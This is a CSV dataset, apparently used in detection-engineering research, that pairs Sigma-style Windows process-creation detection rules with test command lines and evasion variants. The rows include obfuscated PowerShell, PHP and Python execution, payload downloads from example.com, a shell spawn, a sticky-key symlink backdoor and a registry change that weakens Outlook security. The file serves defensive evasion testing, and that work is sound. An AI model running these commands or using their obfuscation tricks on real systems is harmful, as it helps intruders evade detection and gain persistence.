Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1217,proc_creation_win_cmd_dir_execution,File And SubFolder Enumeration Via Dir Command,7c9340a9-e2ee-4e43-94c5-c54ebbea1006,,cmd.exe /c dir c:\ /s >> %temp%\T1083Test1.txt,FALSE,FALSE,FALSE,
t1217,proc_creation_win_cmd_dir_execution,File And SubFolder Enumeration Via Dir Command,7c9340a9-e2ee-4e43-94c5-c54ebbea1006,,"cmd.exe /c dir /s c:\ >> ""%temp%\T1083Test1.txt""",FALSE,FALSE,FALSE,
t1217,proc_creation_win_cmd_dir_execution,File And SubFolder Enumeration Via Dir Command,7c9340a9-e2ee-4e43-94c5-c54ebbea1006,,cmd.exe /c dir /s c:\ >> %TEMP%\T1083Test1.txt,FALSE,FALSE,FALSE,
t1059,proc_creation_win_fsutil_symlinkevaluation,Fsutil Behavior Set SymlinkEvaluation,c0b2768a-dd06-4671-8339-b16ca8d1f27f,,"set-alias -name ""fs"" -value ""fsutil.exe""; fs ""behavior"" ""set"" ""SymlinkEvaluation"" ""L2L:1""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_cobaltstrike_process_patterns,Potential CobaltStrike Process Patterns,f35c5d71-b489-4e22-a115-f003df287317,,conhost.exe 0xffffffff -ForceV1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_cobaltstrike_process_patterns,Potential CobaltStrike Process Patterns,f35c5d71-b489-4e22-a115-f003df287317,,cmd.exe /C whoami,FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_cobaltstrike_process_patterns,Potential CobaltStrike Process Patterns,f35c5d71-b489-4e22-a115-f003df287317,,cmd.exe /C echo test > \\.\pipe\testpipe,FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_cobaltstrike_process_patterns,Potential CobaltStrike Process Patterns,f35c5d71-b489-4e22-a115-f003df287317,,"""cmd.exe"" /C whoami",FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_sliver_c2_execution_pattern,HackTool - Sliver C2 Implant Activity Pattern,42333b2c-b425-441c-b70e-99404a17170f,,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand W0NvbnNvbGVdOjpPdXRwdXRFbmNvZGluZz1bVGV4dC5VVEY4RW5jb2RpbmddOjpVVEY4,FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_sliver_c2_execution_pattern,HackTool - Sliver C2 Implant Activity Pattern,42333b2c-b425-441c-b70e-99404a17170f,,"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_sliver_c2_execution_pattern,HackTool - Sliver C2 Implant Activity Pattern,42333b2c-b425-441c-b70e-99404a17170f,,"powershell.exe -Ex Bypass -Win H -Command ""[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_sliver_c2_execution_pattern,HackTool - Sliver C2 Implant Activity Pattern,42333b2c-b425-441c-b70e-99404a17170f,,"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_hktl_sliver_c2_execution_pattern,HackTool - Sliver C2 Implant Activity Pattern,42333b2c-b425-441c-b70e-99404a17170f,,"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8"" -Command """"",FALSE,FALSE,FALSE,
t1059,proc_creation_win_lolbin_runscripthelper,Suspicious Runscripthelper.exe,eca49c87-8a75-4f13-9c73-a5a29e845f03,,runscripthelper.exe surfacecheck script.ps1 C:\Windows\Temp\..\Windows\Temp,FALSE,FALSE,FALSE,
t1059,proc_creation_win_mshta_inline_vbscript,Wscript Shell Run In CommandLine,2c28c248-7f50-417a-9186-a85b223010ee,,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"calc.exe"""""")",FALSE,FALSE,FALSE,
t1059,proc_creation_win_mshta_inline_vbscript,Wscript Shell Run In CommandLine,2c28c248-7f50-417a-9186-a85b223010ee,,"cmd.exe /c rundll32 vbscript:""\..\mshtml,#135 "" + String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)",FALSE,FALSE,FALSE,
t1059,proc_creation_win_mshta_inline_vbscript,Wscript Shell Run In CommandLine,2c28c248-7f50-417a-9186-a85b223010ee,,"powershell.exe -Command ""[Activator]::CreateInstance([Type]::GetTypeFromProgID('WScript.Shell')).Run('calc.exe')""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_mshta_inline_vbscript,Wscript Shell Run In CommandLine,2c28c248-7f50-417a-9186-a85b223010ee,,"cmd.exe /c ""set a=Wscript. && set b=Shell && set c=Run && call %a%%b%.%c% calc.exe""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_mshta_inline_vbscript,Wscript Shell Run In CommandLine,2c28c248-7f50-417a-9186-a85b223010ee,,"mshta.exe about:<hta:application><script language=""VBScript"">Execute(""CreateObject(""""Wscript.Shell"""").Run """"calc.exe"""""")</script>",FALSE,FALSE,FALSE,
t1059,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"reg.exe add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1 /f",FALSE,FALSE,FALSE,
t1059,proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,Outlook EnableUnsafeClientMailRules Setting Enabled,55f0a3a1-846e-40eb-8273-677371b8d912,,"set ""p1=EnableUnsafe"" && set ""p2=ClientMailRules"" && reg add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v %p1%%p2% /t REG_DWORD /d 1 /f",FALSE,FALSE,FALSE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe -r ""system('whoami');""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe -r ""system(`whoami`);""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe -r ""eval(base64_decode('c3lzdGVtKCd3aG9hbWknKTs='));""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe -r ""\x73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x27\x29\x3b",FALSE,FALSE,FALSE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe -r ""${system}('whoami');",FALSE,FALSE,FALSE,
t1059,proc_creation_win_powershell_run_script_from_input_stream,Run PowerShell Script from Redirected Input Stream,c83bf4b5-cdf0-437c-90fa-43d734f7c476,,powershell.exe - < script.ps1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_powershell_run_script_from_input_stream,Run PowerShell Script from Redirected Input Stream,c83bf4b5-cdf0-437c-90fa-43d734f7c476,,pwsh.exe - < script.ps1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_powershell_run_script_from_input_stream,Run PowerShell Script from Redirected Input Stream,c83bf4b5-cdf0-437c-90fa-43d734f7c476,,powershell.exe -Command - < script.ps1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_powershell_run_script_from_input_stream,Run PowerShell Script from Redirected Input Stream,c83bf4b5-cdf0-437c-90fa-43d734f7c476,,powershell.exe -noprofile - < script.ps1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_powershell_run_script_from_input_stream,Run PowerShell Script from Redirected Input Stream,c83bf4b5-cdf0-437c-90fa-43d734f7c476,,powershell.exe -Command -noprofile - < script.ps1,FALSE,FALSE,FALSE,
t1059,proc_creation_win_pua_wsudo_susp_execution,PUA - Wsudo Suspicious Execution,bdeeabc9-ff2a-4a51-be59-bb253aac7891,,sysupdate.exe -u System cmd.exe,FALSE,FALSE,FALSE,
t1059,proc_creation_win_pua_wsudo_susp_execution,PUA - Wsudo Suspicious Execution,bdeeabc9-ff2a-4a51-be59-bb253aac7891,,sysupdate.exe -uTrustedInstaller cmd.exe,FALSE,FALSE,FALSE,
t1059,proc_creation_win_pua_wsudo_susp_execution,PUA - Wsudo Suspicious Execution,bdeeabc9-ff2a-4a51-be59-bb253aac7891,,sysupdate.exe --ti cmd.exe,FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c'import os; os.system(""whoami"")'",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c""import os; os.system('whoami')""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')"" # test comment",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')""\n",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')""\t",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')""\r",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_inline_command_execution,Python Inline Command Execution,899133d5-4d7c-4a7f-94ee-27355c879d90,,"python.exe -c ""import os; os.system('whoami')""\x20",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_pty_spawn,Python Spawning Pretty TTY on Windows,480e7e51-e797-47e3-8d72-ebfce65b6d8d,,"py.exe -c ""import pty; pty.spawn( '\""/bin/sh\""' )""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_pty_spawn,Python Spawning Pretty TTY on Windows,480e7e51-e797-47e3-8d72-ebfce65b6d8d,,"python.exe -c ""exec(import('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXZuKCIvYmluL3NoIik='))""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_python_pty_spawn,Python Spawning Pretty TTY on Windows,480e7e51-e797-47e3-8d72-ebfce65b6d8d,,"python.exe -c ""import pty; pty. spawn('/bin/sh')""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_renamed_pingcastle,Renamed PingCastle Binary Execution,2433a154-bb3d-42e4-86c3-a26bdac91c45,,pc_renamed.exe --scanner aclcheck --healthcheck --level Full --no-enum-limit --server localhost,FALSE,FALSE,FALSE,
t1059,proc_creation_win_renamed_pingcastle,Renamed PingCastle Binary Execution,2433a154-bb3d-42e4-86c3-a26bdac91c45,,PingCastle.exe --scanner aclcheck --healthcheck --level Full --no-enum-limit --server localhost,FALSE,FALSE,FALSE,
t1059,proc_creation_win_ruby_inline_command_execution,Ruby Inline Command Execution,20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8,,"ruby.exe -e puts\ ""Test Execution""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_ruby_inline_command_execution,Ruby Inline Command Execution,20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8,,"ruby.exe -e""puts 'Test Execution'""",FALSE,FALSE,FALSE,
t1059,proc_creation_win_ruby_inline_command_execution,Ruby Inline Command Execution,20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8,,ruby.exe -e puts\'Test Execution\',FALSE,FALSE,FALSE,
t1059,proc_creation_win_ruby_inline_command_execution,Ruby Inline Command Execution,20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8,,ruby.exe -e puts 'Test Execution',FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o ""%AppData%\test.exe"" http://example.com/test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %AppData%\test.exe h^t^t^p^:^/^/example.com/test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o ""%AP^PDATA%\test.exe"" http://example.com/test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o ""%USERPROFILE%\AppData\Roaming\test.exe"" http://example.com/test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o test.exe http://example.com/test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -Command ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^tt^pexample.com/file.exe -o %AP^PDATA%\file.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=file.exe&& call curl %protocol%%url% -o %dest%""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -Command ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,"cmd.exe /c ""..\..\Windows\System32\calc.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,cmd.exe /c ..\..\Windows\System32\calc.exe,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,"cmd.exe /c ""./.././../Windows/System32/calc.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_path_traversal,Potential CommandLine Path Traversal Via Cmd.EXE,087790e3-3287-436c-bccf-cbd0184a7db1,,"cmd.exe /c ""\Windows\System32\calc.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_stdin_redirect,Read Contents From Stdin Via Cmd.EXE,241e802a-b65e-484f-88cd-c2dc10f9206d,,"""cmd.exe"" /c cmd /r cmd < ""C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_cmd_stdin_redirect,Read Contents From Stdin Via Cmd.EXE,241e802a-b65e-484f-88cd-c2dc10f9206d,,"""cmd.exe"" /c cmd /r cmd<""C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_conhost_path_traversal,Conhost.exe CommandLine Path Traversal,ee5e119b-1f75-4b34-add8-3be976961e39,,"conhost.exe conhost.exe ""..\..\..\..\windows\system32\calc.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_conhost_path_traversal,Conhost.exe CommandLine Path Traversal,ee5e119b-1f75-4b34-add8-3be976961e39,,conhost.exe conhost.exe ..\..\..\..\windows\system32\calc.exe,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_conhost_path_traversal,Conhost.exe CommandLine Path Traversal,ee5e119b-1f75-4b34-add8-3be976961e39,,"conhost.exe ""conhost.exe"" ""..\..\..\..\windows\system32\calc.exe""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,"cmd.exe /c ""psinject""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c spawnas,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c make_token,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,"cmd.exe /c ""rev2self""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c execute-assembly,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c dcsync,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c logonpasswords,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,cmd.exe /c getsystem,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,"cmd.exe /c ""ps^inject""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_cmd,Operator Bloopers Cobalt Strike Commands,647c7b9e-d784-4fda-b9a0-45c565a7b729,,"cmd.exe /c ""m^ake_token""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_modules,Operator Bloopers Cobalt Strike Modules,4f154fb6-27d1-4813-a759-78b93e0b9c48,,"cmd.exe /c ""Invoke-UserHunter""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_modules,Operator Bloopers Cobalt Strike Modules,4f154fb6-27d1-4813-a759-78b93e0b9c48,,"cmd.exe /c ""invoke-userhunter""",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_cobaltstrike_bloopers_modules,Operator Bloopers Cobalt Strike Modules,4f154fb6-27d1-4813-a759-78b93e0b9c48,,"cmd.exe /c ""Invoke-UserHunter""  # Test comment",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_jlaive_batch_execution,HackTool - Jlaive In-Memory Assembly Execution,0a99eb3e-1617-41bd-b095-13dc767f3def,,cmd.exe /c script.bat && xcopy powershell.exe script.bat.exe*,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_jlaive_batch_execution,HackTool - Jlaive In-Memory Assembly Execution,0a99eb3e-1617-41bd-b095-13dc767f3def,,cmd.exe /c script.bat && xcopy pwsh.exe script.bat.exe*,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_jlaive_batch_execution,HackTool - Jlaive In-Memory Assembly Execution,0a99eb3e-1617-41bd-b095-13dc767f3def,,cmd.exe /c script.cmd && attrib +s +h script.cmd.exe && xcopy powershell.exe script.cmd.exe*,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_jlaive_batch_execution,HackTool - Jlaive In-Memory Assembly Execution,0a99eb3e-1617-41bd-b095-13dc767f3def,,cmd.exe /c script.bat && copy powershell.exe script.bat.exe,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_koadic,HackTool - Koadic Execution,5cddf373-ef00-4112-ad72-960ac29bac34,,cmd.exe /q /c chcp 1252,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_koadic,HackTool - Koadic Execution,5cddf373-ef00-4112-ad72-960ac29bac34,,"cmd.exe /q /c ""chcp"" 1252",FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_koadic,HackTool - Koadic Execution,5cddf373-ef00-4112-ad72-960ac29bac34,,cmd.exe /q /c ch^cp 1252,FALSE,FALSE,FALSE,
t1059.003,proc_creation_win_hktl_koadic,HackTool - Koadic Execution,5cddf373-ef00-4112-ad72-960ac29bac34,,cmd.exe /q /c chcp^ 1252,FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"cmd.exe /c ""mklink C:\Windows\System32\osk.exe C:\Windows\System32\cmd.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"cmd /c ""mklink C:\\Windows\\System32\\osk.exe C:\\Windows\\System32\\cmd.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"cmd.exe /c ""mklink \?\C:\Windows\System32\osk.exe \?\C:\Windows\System32\cmd.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"cmd.exe /c ""set a=mk; set b=link; %a%%b% C:\\Windows\\System32\\osk.exe C:\\Windows\\System32\\cmd.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"cmd.exe /c ""mklink /D C:\\Windows\\System32\\osk.exe C:\\Windows\\System32\\cmd.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_mklink_osk_cmd,Potential Privilege Escalation Using Symlink Between Osk and Cmd,e9b61244-893f-427c-b287-3e708f321c6b,,"powershell -Command ""New-Item -ItemType SymbolicLink -Path 'C:\\Windows\\System32\\osk.exe' -Target 'C:\\Windows\\System32\\cmd.exe' -Force""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_sticky_key_like_backdoor_execution,Sticky Key Like Backdoor Execution,2fdefcb3-dbda-401e-ae23-f0db027628bc,,"cmd.exe ^""sethc.exe^""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_sticky_key_like_backdoor_execution,Sticky Key Like Backdoor Execution,2fdefcb3-dbda-401e-ae23-f0db027628bc,,"""cmd.exe"" ""sethc.exe""",FALSE,FALSE,FALSE,
t1546.008,proc_creation_win_cmd_sticky_key_like_backdoor_execution,Sticky Key Like Backdoor Execution,2fdefcb3-dbda-401e-ae23-f0db027628bc,,cmd.exe sethc.exe,FALSE,FALSE,FALSE,
